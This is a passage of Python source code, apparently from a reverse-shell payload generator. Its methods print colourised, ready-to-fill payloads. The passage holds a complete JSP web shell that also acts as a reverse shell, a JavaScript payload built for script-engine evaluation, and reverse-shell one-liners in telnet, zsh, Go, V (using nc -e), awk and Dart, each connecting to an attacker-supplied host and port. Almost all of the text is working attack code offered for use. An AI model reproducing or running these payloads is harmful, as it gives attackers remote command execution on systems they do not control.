                                          proc.getOutputStream());
                outputConnector.start();
                inputConnector.start();
        }
        catch(Exception e) 
}
%>'''+f'''

{TerminalColor.Orange}#JAVA WAY TWO
{TerminalColor.Cyan}<%
    /*
     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
     * the command specified in the HTML form). This is to avoid to keep it simple.
     */
%>

<%@page import="java.lang.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.*"%>

<html>
<head>
    <title>jrshell</title>
</head>
<body>
<form METHOD="POST" NAME="myform" ACTION="">
    <input TYPE="text" NAME="shell">
    <input TYPE="submit" VALUE="Send">
</form>
<pre>
<%
    // Define the OS
    String shellPath = null;
    try'''+'''
    {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
            shellPath = new String("/bin/sh");
        } else {
            shellPath = new String("cmd.exe");
        }
    } catch( Exception e ){}
    // INNER HTML PART
    if (request.getParameter("shell") != null) {
        out.println("Command: " + request.getParameter("shell") + "\\n<BR>");
        Process p;
        if (shellPath.equals("cmd.exe"))
            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
        else
            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
    // TCP PORT PART
    class StreamConnector extends Thread
    {
        InputStream wz;
        OutputStream yr;
        StreamConnector( InputStream wz, OutputStream yr ) {
            this.wz = wz;
            this.yr = yr;
        }
        public void run()
        {
            BufferedReader r  = null;
            BufferedWriter w = null;
            try
            {
                r  = new BufferedReader(new InputStreamReader(wz));
                w = new BufferedWriter(new OutputStreamWriter(yr));
                char buffer[] = new char[8192];
                int length;
                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
                {
                    w.write( buffer, 0, length );
                    w.flush();
                }
            } catch( Exception e ){}
            try
            {
                if( r != null )
                    r.close();
                if( w != null )
                    w.close();
            } catch( Exception e ){}
        }
    }
 
    try {'''+f'''
        Socket socket = new Socket( "{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}", {TerminalColor.Green}{self.lport}{TerminalColor.Cyan} ); // Replace with wanted ip and port
        Process process = Runtime.getRuntime().exec( shellPath );
        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
        out.println("port opened on " + socket);'''+'''
     } catch( Exception e ) {}
%>
</pre>
</body>
</html>

		'''

	def javascript(self):
		return f'''
{TerminalColor.Orange}#JAVASCRIPT
{TerminalColor.Cyan}String command = "var host = '{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}';" +
                       "var port = {TerminalColor.Green}{self.lport}{TerminalColor.Cyan};" +
                       "var cmd = '{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}';"+
                       "var s = new java.net.Socket(host, port);" +
                       "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
                       "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
                       "var po = p.getOutputStream(), so = s.getOutputStream();"+
                       "print ('Connected');"+
                       "while (!s.isClosed()) '''+'''{"+
                       "    while (pi.available() > 0)"+
                       "        so.write(pi.read());"+
                       "    while (pe.available() > 0)"+
                       "        so.write(pe.read());"+
                       "    while (si.available() > 0)"+
                       "        po.write(si.read());"+
                       "    so.flush();"+
                       "    po.flush();"+
                       "    java.lang.Thread.sleep(50);"+
                       "    try {"+
                       "        p.exitValue();"+
                       "        break;"+
                       "    }"+
                       "    catch (e) {"+
                       "    }"+
                       "}"+
                       "p.destroy();"+
                       "s.close();";
String x = "\\"\\".getClass().forName(\\"javax.script.ScriptEngineManager\\").newInstance().getEngineByName(\\"JavaScript\\").eval(\\""+command+"\\")";
ref.add(new StringRefAddr("x", x);


		'''

	def telnet(self):
		return f'''
{TerminalColor.Orange}#TELNET
{TerminalColor.Cyan}TF=$(mktemp -u);mkfifo $TF && telnet {TerminalColor.Green}{self.lhost} {self.lport}{TerminalColor.Cyan} 0<$TF | {TerminalColor.Green}{self.shell}{TerminalColor.Cyan} 1>$TF

		'''

	def zsh(self):
		return f'''
{TerminalColor.Orange}#ZSH
{TerminalColor.Cyan}zsh -c 'zmodload zsh/net/tcp && ztcp {TerminalColor.Green}{self.lhost} {self.lport}{TerminalColor.Cyan} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'

		'''

	def golang(self):
		return f'''
{TerminalColor.Orange}#GOLANG
{TerminalColor.Cyan}echo 'package main;import"os/exec";import"net";func main()'''+'''{c,_:=net.Dial("tcp","'''+f'''{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}");cmd:=exec.Command("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}'''+'''");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'''+f'''

		'''

	def vlang(self):
		return f'''
{TerminalColor.Orange}#VLANG
{TerminalColor.Cyan}echo 'import os' > /tmp/t.v && echo 'fn main()'''+''' { os.system("nc -e'''+f''' {TerminalColor.Green}{self.shell} {self.lhost} {self.lport} {TerminalColor.Cyan}0>&1")'''+''' }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v'''+f'''

		'''

	def awk(self):
		return f'''
{TerminalColor.Orange}#AWK
{TerminalColor.Cyan}awk 'BEGIN'''+''' {s = "/inet/tcp/0/'''+f'''{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}/{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}"; while(42)'''+''' { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null '''+f'''

		'''

	def dart(self):
		return f'''
{TerminalColor.Orange}#DART
{TerminalColor.Cyan}import 'dart:io';
import 'dart:convert';

main() '''+'''{
  Socket.connect("'''+f'''{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}", {TerminalColor.Green}{self.lport}{TerminalColor.Cyan}).then((socket) '''+'''{
    socket.listen((data) {'''+f'''
      Process.start('{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}', []).then((Process process) '''+'''{
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
		'''






